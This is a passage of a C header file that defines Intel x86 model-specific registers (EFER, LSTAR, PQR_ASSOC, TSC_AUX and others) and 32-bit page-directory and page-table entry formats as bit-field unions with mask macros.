     * @brief Resource Monitoring ID
     *
     * [Bits 63:32] ID for monitoring hardware to report monitored data via IA32_QM_CTR.
     *
     * @remarks Bits [N+31:32] N = Ceil (Log2 (CPUID.(EAX= 0FH,ECX=0H).EBX[31:0] + 1))
     */
    UINT64 ResourceMonitoringId : 32;
#define IA32_QM_EVTSEL_RESOURCE_MONITORING_ID_BIT 32
#define IA32_QM_EVTSEL_RESOURCE_MONITORING_ID_FLAG 0xFFFFFFFF00000000
#define IA32_QM_EVTSEL_RESOURCE_MONITORING_ID_MASK 0xFFFFFFFF
#define IA32_QM_EVTSEL_RESOURCE_MONITORING_ID(_) (((_) >> 32) & 0xFFFFFFFF)
  };

  UINT64 Flags;
} IA32_QM_EVTSEL_REGISTER;

/**
 * Monitoring Counter Register.
 *
 * @remarks If ( CPUID.(EAX=07H, ECX=0):EBX.[12] = 1 )
 */
#define IA32_QM_CTR 0x00000C8E
typedef union {
  struct {
    /**
     * [Bits 61:0] Resource Monitored Data.
     */
    UINT64 ResourceMonitoredData : 62;
#define IA32_QM_CTR_RESOURCE_MONITORED_DATA_BIT 0
#define IA32_QM_CTR_RESOURCE_MONITORED_DATA_FLAG 0x3FFFFFFFFFFFFFFF
#define IA32_QM_CTR_RESOURCE_MONITORED_DATA_MASK 0x3FFFFFFFFFFFFFFF
#define IA32_QM_CTR_RESOURCE_MONITORED_DATA(_) (((_) >> 0) & 0x3FFFFFFFFFFFFFFF)

    /**
     * @brief Unavailable
     *
     * [Bit 62] If 1, indicates data for this RMID is not available or not monitored for this
     * resource or RMID.
     */
    UINT64 Unavailable : 1;
#define IA32_QM_CTR_UNAVAILABLE_BIT 62
#define IA32_QM_CTR_UNAVAILABLE_FLAG 0x4000000000000000
#define IA32_QM_CTR_UNAVAILABLE_MASK 0x01
#define IA32_QM_CTR_UNAVAILABLE(_) (((_) >> 62) & 0x01)

    /**
     * @brief Error
     *
     * [Bit 63] If 1, indicates an unsupported RMID or event type was written to IA32_PQR_QM_EVTSEL.
     */
    UINT64 Error : 1;
#define IA32_QM_CTR_ERROR_BIT 63
#define IA32_QM_CTR_ERROR_FLAG 0x8000000000000000
#define IA32_QM_CTR_ERROR_MASK 0x01
#define IA32_QM_CTR_ERROR(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} IA32_QM_CTR_REGISTER;

/**
 * Resource Association Register.
 *
 * @remarks If ( (CPUID.(EAX=07H, ECX=0):EBX[12] = 1) or (CPUID.(EAX=07H, ECX=0):EBX[15] = 1 ) )
 */
#define IA32_PQR_ASSOC 0x00000C8F
typedef union {
  struct {
    /**
     * @brief Resource Monitoring ID <b>(R/W)</b>
     *
     * [Bits 31:0] ID for monitoring hardware to track internal operation, e.g., memory access.
     *
     * @remarks Bits [N-1:0] N = Ceil (Log2 (CPUID.(EAX= 0FH, ECX=0H).EBX[31:0] +1)) 31:N Reserved
     */
    UINT64 ResourceMonitoringId : 32;
#define IA32_PQR_ASSOC_RESOURCE_MONITORING_ID_BIT 0
#define IA32_PQR_ASSOC_RESOURCE_MONITORING_ID_FLAG 0xFFFFFFFF
#define IA32_PQR_ASSOC_RESOURCE_MONITORING_ID_MASK 0xFFFFFFFF
#define IA32_PQR_ASSOC_RESOURCE_MONITORING_ID(_) (((_) >> 0) & 0xFFFFFFFF)

    /**
     * @brief COS <b>(R/W)</b>
     *
     * [Bits 63:32] The class of service (COS) to enforce (on writes); returns the current COS when
     * read.
     *
     * @remarks If ( CPUID.(EAX=07H, ECX=0):EBX.[15] = 1 )
     */
    UINT64 Cos : 32;
#define IA32_PQR_ASSOC_COS_BIT 32
#define IA32_PQR_ASSOC_COS_FLAG 0xFFFFFFFF00000000
#define IA32_PQR_ASSOC_COS_MASK 0xFFFFFFFF
#define IA32_PQR_ASSOC_COS(_) (((_) >> 32) & 0xFFFFFFFF)
  };

  UINT64 Flags;
} IA32_PQR_ASSOC_REGISTER;

/**
 * Supervisor State of MPX Configuration.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=0H):EBX[14] = 1)
 */
#define IA32_BNDCFGS 0x00000D90
typedef union {
  struct {
    /**
     * [Bit 0] Enable Intel MPX in supervisor mode.
     */
    UINT64 Enable : 1;
#define IA32_BNDCFGS_ENABLE_BIT 0
#define IA32_BNDCFGS_ENABLE_FLAG 0x01
#define IA32_BNDCFGS_ENABLE_MASK 0x01
#define IA32_BNDCFGS_ENABLE(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Preserve the bounds registers for near branch instructions in the absence of the BND
     * prefix.
     */
    UINT64 BndPreserve : 1;
#define IA32_BNDCFGS_BND_PRESERVE_BIT 1
#define IA32_BNDCFGS_BND_PRESERVE_FLAG 0x02
#define IA32_BNDCFGS_BND_PRESERVE_MASK 0x01
#define IA32_BNDCFGS_BND_PRESERVE(_) (((_) >> 1) & 0x01)
    UINT64 Reserved1 : 10;

    /**
     * [Bits 63:12] Base Address of Bound Directory.
     */
    UINT64 BoundDirectoryBaseAddress : 52;
#define IA32_BNDCFGS_BOUND_DIRECTORY_BASE_ADDRESS_BIT 12
#define IA32_BNDCFGS_BOUND_DIRECTORY_BASE_ADDRESS_FLAG 0xFFFFFFFFFFFFF000
#define IA32_BNDCFGS_BOUND_DIRECTORY_BASE_ADDRESS_MASK 0xFFFFFFFFFFFFF
#define IA32_BNDCFGS_BOUND_DIRECTORY_BASE_ADDRESS(_) (((_) >> 12) & 0xFFFFFFFFFFFFF)
  };

  UINT64 Flags;
} IA32_BNDCFGS_REGISTER;

/**
 * Extended Supervisor State Mask.
 *
 * @remarks If ( CPUID.(0DH, 1):EAX.[3] = 1
 */
#define IA32_XSS 0x00000DA0
typedef union {
  struct {
    UINT64 Reserved1 : 8;

    /**
     * [Bit 8] Trace Packet Configuration State.
     */
    UINT64 TracePacketConfigurationState : 1;
#define IA32_XSS_TRACE_PACKET_CONFIGURATION_STATE_BIT 8
#define IA32_XSS_TRACE_PACKET_CONFIGURATION_STATE_FLAG 0x100
#define IA32_XSS_TRACE_PACKET_CONFIGURATION_STATE_MASK 0x01
#define IA32_XSS_TRACE_PACKET_CONFIGURATION_STATE(_) (((_) >> 8) & 0x01)
    UINT64 Reserved2 : 55;
  };

  UINT64 Flags;
} IA32_XSS_REGISTER;

/**
 * Package Level Enable/disable HDC.
 *
 * @remarks If CPUID.06H:EAX.[13] = 1
 */
#define IA32_PKG_HDC_CTL 0x00000DB0
typedef union {
  struct {
    /**
     * @brief HDC_Pkg_Enable <b>(R/W)</b>
     *
     * [Bit 0] Force HDC idling or wake up HDC-idled logical processors in the package.
     *
     * @remarks If CPUID.06H:EAX.[13] = 1
     * @see Vol3B[14.5.2(Package level Enabling HDC)]
     */
    UINT64 HdcPkgEnable : 1;
#define IA32_PKG_HDC_CTL_HDC_PKG_ENABLE_BIT 0
#define IA32_PKG_HDC_CTL_HDC_PKG_ENABLE_FLAG 0x01
#define IA32_PKG_HDC_CTL_HDC_PKG_ENABLE_MASK 0x01
#define IA32_PKG_HDC_CTL_HDC_PKG_ENABLE(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 63;
  };

  UINT64 Flags;
} IA32_PKG_HDC_CTL_REGISTER;

/**
 * Enable/disable HWP.
 *
 * @remarks If CPUID.06H:EAX.[13] = 1
 */
#define IA32_PM_CTL1 0x00000DB1
typedef union {
  struct {
    /**
     * @brief HDC_Allow_Block <b>(R/W)</b>
     *
     * [Bit 0] Allow/Block this logical processor for package level HDC control.
     *
     * @remarks If CPUID.06H:EAX.[13] = 1
     * @see Vol3B[14.5.3(Logical-Processor Level HDC Control)]
     */
    UINT64 HdcAllowBlock : 1;
#define IA32_PM_CTL1_HDC_ALLOW_BLOCK_BIT 0
#define IA32_PM_CTL1_HDC_ALLOW_BLOCK_FLAG 0x01
#define IA32_PM_CTL1_HDC_ALLOW_BLOCK_MASK 0x01
#define IA32_PM_CTL1_HDC_ALLOW_BLOCK(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 63;
  };

  UINT64 Flags;
} IA32_PM_CTL1_REGISTER;

/**
 * Per-Logical_Processor HDC Idle Residency.
 *
 * @remarks If CPUID.06H:EAX.[13] = 1
 */
#define IA32_THREAD_STALL 0x00000DB2
typedef struct {
  /**
   * @brief Stall_Cycle_Cnt <b>(R/W)</b>
   *
   * Stalled cycles due to HDC forced idle on this logical processor.
   *
   * @remarks If CPUID.06H:EAX.[13] = 1
   * @see Vol3B[14.5.4.1(IA32_THREAD_STALL)]
   */
  UINT64 StallCycleCount;
} IA32_THREAD_STALL_REGISTER;

/**
 * Extended Feature Enables.
 *
 * @remarks If CPUID.06H:EAX.[13] = 1
 */
#define IA32_EFER 0xC0000080
typedef union {
  struct {
    /**
     * @brief SYSCALL Enable <b>(R/W)</b>
     *
     * [Bit 0] Enables SYSCALL/SYSRET instructions in 64-bit mode.
     */
    UINT64 SyscallEnable : 1;
#define IA32_EFER_SYSCALL_ENABLE_BIT 0
#define IA32_EFER_SYSCALL_ENABLE_FLAG 0x01
#define IA32_EFER_SYSCALL_ENABLE_MASK 0x01
#define IA32_EFER_SYSCALL_ENABLE(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 7;

    /**
     * @brief IA-32e Mode Enable <b>(R/W)</b>
     *
     * [Bit 8] Enables IA-32e mode operation.
     */
    UINT64 Ia32EModeEnable : 1;
#define IA32_EFER_IA32E_MODE_ENABLE_BIT 8
#define IA32_EFER_IA32E_MODE_ENABLE_FLAG 0x100
#define IA32_EFER_IA32E_MODE_ENABLE_MASK 0x01
#define IA32_EFER_IA32E_MODE_ENABLE(_) (((_) >> 8) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * @brief IA-32e Mode Active <b>(R)</b>
     *
     * [Bit 10] Indicates IA-32e mode is active when set.
     */
    UINT64 Ia32EModeActive : 1;
#define IA32_EFER_IA32E_MODE_ACTIVE_BIT 10
#define IA32_EFER_IA32E_MODE_ACTIVE_FLAG 0x400
#define IA32_EFER_IA32E_MODE_ACTIVE_MASK 0x01
#define IA32_EFER_IA32E_MODE_ACTIVE(_) (((_) >> 10) & 0x01)

    /**
     * [Bit 11] Execute Disable Bit Enable.
     */
    UINT64 ExecuteDisableBitEnable : 1;
#define IA32_EFER_EXECUTE_DISABLE_BIT_ENABLE_BIT 11
#define IA32_EFER_EXECUTE_DISABLE_BIT_ENABLE_FLAG 0x800
#define IA32_EFER_EXECUTE_DISABLE_BIT_ENABLE_MASK 0x01
#define IA32_EFER_EXECUTE_DISABLE_BIT_ENABLE(_) (((_) >> 11) & 0x01)
    UINT64 Reserved3 : 52;
  };

  UINT64 Flags;
} IA32_EFER_REGISTER;

/**
 * System Call Target Address.
 *
 * @remarks If CPUID.80000001:EDX.[29] = 1
 */
#define IA32_STAR 0xC0000081

/**
 * @brief IA-32e Mode System Call Target Address <b>(R/W)</b>
 *
 * Target RIP for the called procedure when SYSCALL is executed in 64-bit mode.
 *
 * @remarks If CPUID.80000001:EDX.[29] = 1
 */
#define IA32_LSTAR 0xC0000082

/**
 * @brief IA-32e Mode System Call Target Address <b>(R/W)</b>
 *
 * Not used, as the SYSCALL instruction is not recognized in compatibility mode.
 *
 * @remarks If CPUID.80000001:EDX.[29] = 1
 */
#define IA32_CSTAR 0xC0000083

/**
 * System Call Flag Mask.
 *
 * @remarks If CPUID.80000001:EDX.[29] = 1
 */
#define IA32_FMASK 0xC0000084

/**
 * Map of BASE Address of FS.
 *
 * @remarks If CPUID.80000001:EDX.[29] = 1
 */
#define IA32_FS_BASE 0xC0000100

/**
 * Map of BASE Address of GS.
 *
 * @remarks If CPUID.80000001:EDX.[29] = 1
 */
#define IA32_GS_BASE 0xC0000101

/**
 * Swap Target of BASE Address of GS.
 *
 * @remarks If CPUID.80000001:EDX.[29] = 1
 */
#define IA32_KERNEL_GS_BASE 0xC0000102

/**
 * Auxiliary TSC.
 *
 * @remarks If CPUID.80000001H: EDX[27] = 1 or CPUID.(EAX=7,ECX=0):ECX[bit 22] = 1
 */
#define IA32_TSC_AUX 0xC0000103
typedef union {
  struct {
    /**
     * [Bits 31:0] AUX. Auxiliary signature of TSC.
     */
    UINT64 TscAuxiliarySignature : 32;
#define IA32_TSC_AUX_TSC_AUXILIARY_SIGNATURE_BIT 0
#define IA32_TSC_AUX_TSC_AUXILIARY_SIGNATURE_FLAG 0xFFFFFFFF
#define IA32_TSC_AUX_TSC_AUXILIARY_SIGNATURE_MASK 0xFFFFFFFF
#define IA32_TSC_AUX_TSC_AUXILIARY_SIGNATURE(_) (((_) >> 0) & 0xFFFFFFFF)
    UINT64 Reserved1 : 32;
  };

  UINT64 Flags;
} IA32_TSC_AUX_REGISTER;

/**
 * @}
 */

/**
 * @defgroup PAGING \
 *           Paging
 * @{
 */
/**
 * @defgroup PAGING_32 \
 *           32-Bit Paging
 *
 * A logical processor uses 32-bit paging if CR0.PG = 1 and CR4.PAE = 0. 32-bit paging translates
 * 32-bit linear addresses to 40-bit physical addresses. Although 40 bits corresponds to 1 TByte,
 * linear addresses are limited to 32 bits; at most 4 GBytes of linear-address space may be accessed
 * at any given time. 32-bit paging uses a hierarchy of paging structures to produce a translation
 * for a linear address. CR3 is used to locate the first paging-structure, the page directory.
 * 32-bit paging may map linear addresses to either 4-KByte pages or 4-MByte pages.
 *
 * @see Vol3A[4.5(4-LEVEL PAGING)] (reference)
 * @{
 */
/**
 * @brief Format of a 32-Bit Page-Directory Entry that Maps a 4-MByte Page
 */
typedef union {
  struct {
    /**
     * [Bit 0] Present; must be 1 to map a 4-MByte page.
     */
    UINT32 Present : 1;
#define PDE_4MB_32_PRESENT_BIT 0
#define PDE_4MB_32_PRESENT_FLAG 0x01
#define PDE_4MB_32_PRESENT_MASK 0x01
#define PDE_4MB_32_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Read/write; if 0, writes may not be allowed to the 4-MByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT32 Write : 1;
#define PDE_4MB_32_WRITE_BIT 1
#define PDE_4MB_32_WRITE_FLAG 0x02
#define PDE_4MB_32_WRITE_MASK 0x01
#define PDE_4MB_32_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 4-MByte page
     * referenced by this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT32 Supervisor : 1;
#define PDE_4MB_32_SUPERVISOR_BIT 2
#define PDE_4MB_32_SUPERVISOR_FLAG 0x04
#define PDE_4MB_32_SUPERVISOR_MASK 0x01
#define PDE_4MB_32_SUPERVISOR(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the
     * 4-MByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT32 PageLevelWriteThrough : 1;
#define PDE_4MB_32_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PDE_4MB_32_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PDE_4MB_32_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PDE_4MB_32_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the
     * 4-MByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT32 PageLevelCacheDisable : 1;
#define PDE_4MB_32_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PDE_4MB_32_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PDE_4MB_32_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PDE_4MB_32_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Accessed; indicates whether software has accessed the 4-MByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT32 Accessed : 1;
#define PDE_4MB_32_ACCESSED_BIT 5
#define PDE_4MB_32_ACCESSED_FLAG 0x20
#define PDE_4MB_32_ACCESSED_MASK 0x01
#define PDE_4MB_32_ACCESSED(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] Dirty; indicates whether software has written to the 4-MByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT32 Dirty : 1;
#define PDE_4MB_32_DIRTY_BIT 6
#define PDE_4MB_32_DIRTY_FLAG 0x40
#define PDE_4MB_32_DIRTY_MASK 0x01
#define PDE_4MB_32_DIRTY(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Page size; must be 1 (otherwise, this entry references a page table).
     */
    UINT32 LargePage : 1;
#define PDE_4MB_32_LARGE_PAGE_BIT 7
#define PDE_4MB_32_LARGE_PAGE_FLAG 0x80
#define PDE_4MB_32_LARGE_PAGE_MASK 0x01
#define PDE_4MB_32_LARGE_PAGE(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored
     * otherwise.
     *
     * @see Vol3A[4.10(Caching Translation Information)]
     */
    UINT32 Global : 1;
#define PDE_4MB_32_GLOBAL_BIT 8
#define PDE_4MB_32_GLOBAL_FLAG 0x100
#define PDE_4MB_32_GLOBAL_MASK 0x01
#define PDE_4MB_32_GLOBAL(_) (((_) >> 8) & 0x01)

    /**
     * [Bits 11:9] Ignored.
     */
    UINT32 Ignored1 : 3;
#define PDE_4MB_32_IGNORED_1_BIT 9
#define PDE_4MB_32_IGNORED_1_FLAG 0xE00
#define PDE_4MB_32_IGNORED_1_MASK 0x07
#define PDE_4MB_32_IGNORED_1(_) (((_) >> 9) & 0x07)

    /**
     * [Bit 12] Indirectly determines the memory type used to access the 4-MByte page referenced by
     * this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT32 Pat : 1;
#define PDE_4MB_32_PAT_BIT 12
#define PDE_4MB_32_PAT_FLAG 0x1000
#define PDE_4MB_32_PAT_MASK 0x01
#define PDE_4MB_32_PAT(_) (((_) >> 12) & 0x01)

    /**
     * [Bits 20:13] Bits (M-1):32 of physical address of the 4-MByte page referenced by this entry.
     */
    UINT32 PageFrameNumberLow : 8;
#define PDE_4MB_32_PAGE_FRAME_NUMBER_LOW_BIT 13
#define PDE_4MB_32_PAGE_FRAME_NUMBER_LOW_FLAG 0x1FE000
#define PDE_4MB_32_PAGE_FRAME_NUMBER_LOW_MASK 0xFF
#define PDE_4MB_32_PAGE_FRAME_NUMBER_LOW(_) (((_) >> 13) & 0xFF)
    UINT32 Reserved1 : 1;

    /**
     * [Bits 31:22] Bits 31:22 of physical address of the 4-MByte page referenced by this entry.
     */
    UINT32 PageFrameNumberHigh : 10;
#define PDE_4MB_32_PAGE_FRAME_NUMBER_HIGH_BIT 22
#define PDE_4MB_32_PAGE_FRAME_NUMBER_HIGH_FLAG 0xFFC00000
#define PDE_4MB_32_PAGE_FRAME_NUMBER_HIGH_MASK 0x3FF
#define PDE_4MB_32_PAGE_FRAME_NUMBER_HIGH(_) (((_) >> 22) & 0x3FF)
  };

  UINT32 Flags;
} PDE_4MB_32;

/**
 * @brief Format of a 32-Bit Page-Directory Entry that References a Page Table
 */
typedef union {
  struct {
    /**
     * [Bit 0] Present; must be 1 to reference a page table.
     */
    UINT32 Present : 1;
#define PDE_32_PRESENT_BIT 0
#define PDE_32_PRESENT_FLAG 0x01
#define PDE_32_PRESENT_MASK 0x01
#define PDE_32_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Read/write; if 0, writes may not be allowed to the 4-MByte region controlled by this
     * entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT32 Write : 1;
#define PDE_32_WRITE_BIT 1
#define PDE_32_WRITE_FLAG 0x02
#define PDE_32_WRITE_MASK 0x01
#define PDE_32_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 4-MByte region
     * controlled by this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT32 Supervisor : 1;
#define PDE_32_SUPERVISOR_BIT 2
#define PDE_32_SUPERVISOR_FLAG 0x04
#define PDE_32_SUPERVISOR_MASK 0x01
#define PDE_32_SUPERVISOR(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the
     * page table referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT32 PageLevelWriteThrough : 1;
#define PDE_32_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PDE_32_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PDE_32_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PDE_32_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the
     * page table referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT32 PageLevelCacheDisable : 1;
#define PDE_32_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PDE_32_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PDE_32_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PDE_32_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Accessed; indicates whether this entry has been used for linear-address translation.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT32 Accessed : 1;
#define PDE_32_ACCESSED_BIT 5
#define PDE_32_ACCESSED_FLAG 0x20
#define PDE_32_ACCESSED_MASK 0x01
#define PDE_32_ACCESSED(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] Ignored.
     */
    UINT32 Ignored1 : 1;
#define PDE_32_IGNORED_1_BIT 6
#define PDE_32_IGNORED_1_FLAG 0x40
#define PDE_32_IGNORED_1_MASK 0x01
#define PDE_32_IGNORED_1(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] If CR4.PSE = 1, must be 0 (otherwise, this entry maps a 4-MByte page); otherwise,
     * ignored.
     */
    UINT32 LargePage : 1;
#define PDE_32_LARGE_PAGE_BIT 7
#define PDE_32_LARGE_PAGE_FLAG 0x80
#define PDE_32_LARGE_PAGE_MASK 0x01
#define PDE_32_LARGE_PAGE(_) (((_) >> 7) & 0x01)

    /**
     * [Bits 11:8] Ignored.
     */
    UINT32 Ignored2 : 4;
#define PDE_32_IGNORED_2_BIT 8
#define PDE_32_IGNORED_2_FLAG 0xF00
#define PDE_32_IGNORED_2_MASK 0x0F
#define PDE_32_IGNORED_2(_) (((_) >> 8) & 0x0F)

    /**
     * [Bits 31:12] Physical address of 4-KByte aligned page table referenced by this entry.
     */
    UINT32 PageFrameNumber : 20;
#define PDE_32_PAGE_FRAME_NUMBER_BIT 12
#define PDE_32_PAGE_FRAME_NUMBER_FLAG 0xFFFFF000
#define PDE_32_PAGE_FRAME_NUMBER_MASK 0xFFFFF
#define PDE_32_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFF)
  };

  UINT32 Flags;
} PDE_32;

/**
 * @brief Format of a 32-Bit Page-Table Entry that Maps a 4-KByte Page
 */
typedef union {
  struct {
    /**
     * [Bit 0] Present; must be 1 to map a 4-KByte page.
     */
    UINT32 Present : 1;
#define PTE_32_PRESENT_BIT 0
#define PTE_32_PRESENT_FLAG 0x01
#define PTE_32_PRESENT_MASK 0x01
#define PTE_32_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Read/write; if 0, writes may not be allowed to the 4-KByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT32 Write : 1;
#define PTE_32_WRITE_BIT 1
#define PTE_32_WRITE_FLAG 0x02
#define PTE_32_WRITE_MASK 0x01
#define PTE_32_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 4-KByte page
     * referenced by this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT32 Supervisor : 1;
#define PTE_32_SUPERVISOR_BIT 2
#define PTE_32_SUPERVISOR_FLAG 0x04
#define PTE_32_SUPERVISOR_MASK 0x01
#define PTE_32_SUPERVISOR(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the
     * 4-KByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT32 PageLevelWriteThrough : 1;
#define PTE_32_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PTE_32_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PTE_32_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PTE_32_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the
     * 4-KByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT32 PageLevelCacheDisable : 1;
#define PTE_32_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PTE_32_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PTE_32_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PTE_32_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Accessed; indicates whether software has accessed the 4-KByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT32 Accessed : 1;
#define PTE_32_ACCESSED_BIT 5
#define PTE_32_ACCESSED_FLAG 0x20
#define PTE_32_ACCESSED_MASK 0x01
#define PTE_32_ACCESSED(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] Dirty; indicates whether software has written to the 4-KByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT32 Dirty : 1;
#define PTE_32_DIRTY_BIT 6
#define PTE_32_DIRTY_FLAG 0x40
#define PTE_32_DIRTY_MASK 0x01
#define PTE_32_DIRTY(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Indirectly determines the memory type used to access the 4-KByte page referenced by
     * this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT32 Pat : 1;
#define PTE_32_PAT_BIT 7
#define PTE_32_PAT_FLAG 0x80
#define PTE_32_PAT_MASK 0x01
#define PTE_32_PAT(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored
     * otherwise.
     *
     * @see Vol3A[4.10(Caching Translation Information)]
     */
    UINT32 Global : 1;
#define PTE_32_GLOBAL_BIT 8
#define PTE_32_GLOBAL_FLAG 0x100
#define PTE_32_GLOBAL_MASK 0x01
#define PTE_32_GLOBAL(_) (((_) >> 8) & 0x01)

    /**
     * [Bits 11:9] Ignored.
     */
    UINT32 Ignored1 : 3;
#define PTE_32_IGNORED_1_BIT 9
#define PTE_32_IGNORED_1_FLAG 0xE00
#define PTE_32_IGNORED_1_MASK 0x07
#define PTE_32_IGNORED_1(_) (((_) >> 9) & 0x07)

    /**
     * [Bits 31:12] Physical address of 4-KByte aligned page table referenced by this entry.
     */
    UINT32 PageFrameNumber : 20;
#define PTE_32_PAGE_FRAME_NUMBER_BIT 12
#define PTE_32_PAGE_FRAME_NUMBER_FLAG 0xFFFFF000
#define PTE_32_PAGE_FRAME_NUMBER_MASK 0xFFFFF
#define PTE_32_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFF)
  };

  UINT32 Flags;
} PTE_32;

/**
 * @brief Format of a common Page-Table Entry
 */
typedef union {
  struct {
    UINT32 Present : 1;
#define PT_ENTRY_32_PRESENT_BIT 0
#define PT_ENTRY_32_PRESENT_FLAG 0x01
#define PT_ENTRY_32_PRESENT_MASK 0x01
#define PT_ENTRY_32_PRESENT(_) (((_) >> 0) & 0x01)
    UINT32 Write : 1;
#define PT_ENTRY_32_WRITE_BIT 1
#define PT_ENTRY_32_WRITE_FLAG 0x02
#define PT_ENTRY_32_WRITE_MASK 0x01
#define PT_ENTRY_32_WRITE(_) (((_) >> 1) & 0x01)
    UINT32 Supervisor : 1;
#define PT_ENTRY_32_SUPERVISOR_BIT 2
#define PT_ENTRY_32_SUPERVISOR_FLAG 0x04
#define PT_ENTRY_32_SUPERVISOR_MASK 0x01
#define PT_ENTRY_32_SUPERVISOR(_) (((_) >> 2) & 0x01)
    UINT32 PageLevelWriteThrough : 1;
#define PT_ENTRY_32_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PT_ENTRY_32_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PT_ENTRY_32_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PT_ENTRY_32_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)
    UINT32 PageLevelCacheDisable : 1;
#define PT_ENTRY_32_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PT_ENTRY_32_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
